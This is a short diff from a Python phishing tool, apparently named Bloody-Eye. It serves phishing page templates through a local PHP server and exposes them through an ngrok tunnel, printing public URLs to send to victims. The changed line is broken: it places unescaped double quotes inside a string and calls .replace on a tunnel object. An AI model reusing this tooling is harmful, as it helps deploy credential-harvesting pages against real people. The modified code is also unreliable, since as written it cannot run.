@@ -548,7 +548,7 @@ exit();""")
              Popen(("php","-S","localhost:6060","-t","../Bloody-Eye/templates/phishing"),stderr=phplog,stdout=phplog)
           bannner.banner()
           global token
-          a = ngrok.connect(6060,"http",auth_token=token)
+          a = ngrok.connect(6060,"http",auth_token=token).replace("lvl=warn msg="failed to get home directory, using $HOME instead" err="user: Current requires cgo or $USER set in environment" $HOME=/data/data/com.termux/files/home","")
           print("\n"+Fore.RED+" [~] URL 1 : "+Fore.BLUE+str(a).replace('"','').replace("NgrokTunnel:","").replace("http://","https://").replace("-> https://localhost:6060",""))
           print("\n"+Fore.RED+" [~] URL 2 : "+Fore.BLUE+str(a).replace('"','').replace("NgrokTunnel:","").replace("-> http://localhost:6060",""))
        except:
